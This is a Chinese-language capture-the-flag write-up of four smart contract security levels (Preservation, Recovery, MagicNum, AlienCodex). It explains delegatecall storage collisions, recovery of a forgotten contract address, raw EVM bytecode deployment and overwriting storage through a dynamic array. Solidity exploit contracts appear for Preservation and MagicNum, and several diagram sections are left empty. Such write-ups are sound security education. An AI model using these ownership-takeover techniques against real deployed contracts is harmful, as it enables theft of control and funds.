

# 第十六关：Preservation

### 本关知识点：
```
1. delegatecall调用
2. 合约变量的存储
3. uint256和address的类型转换
```

## 1. 题目要求
` 尝试取得合约的所有权（`owner`）。`

## 2. 代码功能解读
```
Preservation
	1. 构造器初始化传入的两个地址，用两个地址变量接收，并将合约部署者设置为owner变量。
	2. setFirstTime这个方法传入一个uint变量，用timeZone1Library进行delegatecall调用setTime(uint256)方法，方法参数为传入的uint变量。
	3. setFirstTime这个方法传入一个uint变量，用timeZone2Library进行delegatecall调用setTime(uint256)方法，方法参数为传入的uint变量。
LibraryContract
	1. setTime方法将跟新storedTime状态变量。
```


## 3. 漏洞分析
```
通过delegatecall更改调用者合约的参数。
	1. uint的大小是256位，address的大小是160位，我们把address伪装为uint，然后传入setFirstTime方法，将timeZone1Library变量设置为自己的地址。
	2. 在攻击合约中将"setTime(uint256)"方法设置为修改第四个槽位的值为玩家的地址。
```

## 4. 攻击方法
``` java
contract Exploit {

  Preservation pres;

  address solt1;

  address solt2;

  // uint256 solt3;

  constructor(address addr) {

    pres = Preservation(addr);

  }

  

  function attack()public {

    uint256 time = uint256(uint160(address(this)));

    pres.setFirstTime(time);

    require(pres.timeZone1Library() == address(this), "error attack");

    pres.setFirstTime(time);

  }

    function setTime(uint _player) public {

    solt2 = address(uint160(_player));

  }

}
```

## 5. 攻击调用图



# 第十七关：Recovery

### 本关知识点：
```
1. 
```

## 1. 题目要求
` 如果您能从丢失的的合约地址中找回(或移除)，则顺利通过此关`

## 2. 代码功能解读
```
Recovery
	1. generateToken方法传入名称和代币数量，然后为调用者创建一个代币合约。
SimpleToken
	1. 构造器初始化合约的name和创建者的balances。
	2. receive是一个可支付的回退方法，跟新调用者的balances。
	3. transfer方法发送小于或等于自己数量的token给其他玩家。
	4. destroy方法中执行自毁函数，将金额发送给传入的to地址。
```


## 3. 漏洞分析
```
找到忘记的合约地址
	1. 我们可以通过区块链浏览器查看所有调用了generateToken方法的人，找到忘记地址的玩家创建的地址。
	2. 调用合约的destroy方法发送余额给玩家。
```

## 4. 攻击方法

 ``在区块链中查询到玩家创建的合约地址
 ``调用destroy方法


## 5. 攻击调用图



# 第十八关：MagicNum

### 本关知识点：
```
1. evm操作码
2. 区分创建时字节码和运行时字节码
```

## 1. 题目要求
` 需要为以太坊提供一个求解器，一个用正确的数字响应，且求解器的大小最多10个操作码`

## 2. 代码功能解读
```
1. setSolver方法设置传入的地址为solver。
```


## 3. 漏洞分析
```
用evm操作码创建编写合约方法
	先编写运行时字节码返回数字42，然后用创建时字节码返回运行时字节码
然后将返回的地址传入setSolver方法调用

```

## 4. 攻击方法
```
contract Exploit{

  MagicNum magic;

  constructor(address addr) {

    magic = MagicNum(addr);

  }

  function attack() public{

    address addr;

    assembly {

        let ptr := mload(0x40)

        mstore(ptr, shl(0x68, 0x69602A60005260206000F3600052600A6016F3))

        addr := create(0, ptr, 0x13)

    }

    magic.setSolver(addr);

    magic.setSolver(addr);

  }

}
```

## 5. 攻击调用图

## 6. 知识点分析


# 第十九关：AlienCodex

### 本关知识点：
```
1. 合约状态变量的存储
2. 动态数组的写入位置
```

## 1. 题目要求
` 你打开了一个 Alien 合约. 申明所有权来完成这一关.`

## 2. 代码功能解读
```
1. 修饰器contacted判断变量contact是不是为true，为true则可以往下执行
2. makeContact方法设置contract为true
3. record方法，往codex数组中push数据
4. retract方法，缩短codex的长度
5. revise设置codex某个索引位置的值
```


## 3. 漏洞分析
```
更新owner状态变量为玩家地址
	在合约中，动态数组可以访问到任何位置，所以我们在了解动态数组的写入位置后可以覆盖到owner的值。
```

## 4. 攻击方法
```
用length--打开所有的数组索引
	在符合i+初始位置等于最大值的地方写入player；
	如何不打开数组索引，那么我们修改元素会失败。
```

## 5. 攻击调用图

## 6. 知识点分析
